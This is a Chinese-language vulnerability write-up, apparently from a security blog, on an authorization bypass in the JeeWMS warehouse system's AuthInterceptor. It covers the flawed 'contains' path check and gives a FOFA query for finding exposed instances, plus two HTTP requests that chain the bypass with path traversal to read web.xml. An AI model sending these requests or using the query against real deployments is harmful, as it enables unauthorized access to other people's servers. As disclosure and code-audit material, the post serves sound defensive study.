---
title: "JeeWMS AuthInterceptor 权限绕过漏洞"
source: https://mrxn.net/jswz/JeeWMS-AuthInterceptor-authbypass.html
asset_dir: assets/jeewms-authinterceptor-权限绕过漏洞
---

# JeeWMS AuthInterceptor 权限绕过漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/27 08:19
- 932浏览
- [0评论](#comment)
- 32分钟阅读

深入探索

软件

SQL

恶意软件分析工具

---

# 漏洞简介

JeeWMS 是基于Java全栈技术打造的智能仓储中枢系统，具备多形态仓储场景深度适配能力（兼容3PL第三方物流与厂内物流双模式）。JeeWMS `AuthInterceptor` 存在[权限绕过](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)漏洞，由于系统获取请求路径使用 `request.getRequestURI()` 导致可以通过配合 `excludeContainUrls` 达到绕过系统权限校验逻辑。

漏洞预警服务

# 影响版本

最新版本（低于commit 7f78ed57）

# fofa语法

> `body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"`

# 漏洞分析

先看下 `web.xml` 里关于 `excludeContainUrls` 部分的配置

```
<property name="excludeContainUrls">
  <list>
    <value>systemController/showOrDownByurl.do</value>
    <value>wmsApiController.do</value>
  </list>
</property>
```

包含两条URL path

- `systemController/showOrDownByurl.do`
- `wmsApiController.do`

再看下 `AuthInterceptor.java` 中在controller前拦截的函数 `preHandle`

```
@Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object object) throws Exception {
        String requestPath = ResourceUtil.getRequestPath(request); // 用户访问的资源地址
        //logger.info("-----authInterceptor----requestPath------" + requestPath);
        // 步骤一： 判断是否是排除拦截请求，直接返回 TRUE
        if (requestPath.matches("^rest/[a-zA-Z0-9_/]+$")) {
            return true;
        }
        if (excludeUrls.contains(requestPath)) {
            return true;
        } else if (moHuContain(excludeContainUrls, requestPath)) {
            return true;
        } else {
```

深入探索

安全

企业安全咨询

网络安全课程

这里对 `requestPath` 经过前面两个 if 判断后，在第三个 if 的部分，调用了 `moHuContain` 方法来判断请求的url路径是否包含 `excludeContainUrls` 里面的值之一。

```
private boolean moHuContain(List<String> list, String key) {
        for (String str : list) {
            if (key.contains(str)) {
                return true;
            }
        }
        return false;
    }
```

`moHuContain` 的作用就是检查一个字符串`key`是否模糊包含（即包含）列表`list`中的任意一个字符串元素。

也就是说如果请求url路径包含 `systemController/showOrDownByurl.do` 或 `wmsApiController.do` 之一返回 `true` ，即[绕过权限验证](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)。

再回头看 `String requestPath = ResourceUtil.getRequestPath(request);` 这句对请求url路径的赋值，跟进 `ResourceUtil.getRequestPath` 方法

```
public static String getRequestPath(HttpServletRequest request) {

//      String requestPath = request.getRequestURI() + "?" + request.getQueryString();
        String queryString = request.getQueryString();
        String requestPath = request.getRequestURI();
        if(StringUtils.isNotEmpty(queryString)){
            requestPath += "?" + queryString;
        }

        if (requestPath.indexOf("&") > -1) {// 去掉其他参数
            requestPath = requestPath.substring(0, requestPath.indexOf("&"));
        }
        requestPath = requestPath.substring(request.getContextPath().length() + 1);// 去掉项目路径
        return requestPath;
    }
```

使用了 `request.getRequestURI()` 来获取请求url路径，而这个又回到了老生常谈的问题，具体的底层处理逻辑可以去先知（Tomcat URL解析差异性导致的安全问题）1学习下，至此所有链路都通了，下面我们用之前的文件读取[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)测试下。

文件大小转换

# 漏洞复现

```
POST /systemController/showOrDownByurl.do/../../cgformTemplateController.do?showPic=11 HTTP/1.1
Host: localhost:8081
Content-Type: application/x-www-form-urlencoded

code=../../../&path=../web.xml
```

```
POST /wmsApiController.do/../cgformTemplateController.do?showPic=11 HTTP/1.1
Host: localhost:8081
Content-Type: application/x-www-form-urlencoded

code=../../../../&path=../WEB-INF/web.xml
```

成功读取到了 web.xml 文件内容

漏洞预警服务

[![JeeWMS AuthInterceptor 权限绕过漏洞](images/img-001-a61fb95d7bae.webp)](https://image.mrxn.net/79509fe0485645209e7499b02f2eb937.webp)

# 参考

- `https://xz.aliyun.com/news/7139`
- `https://gitee.com/erzhongxmu/JEEWMS/issues/IC8RPM`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#权限绕过](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
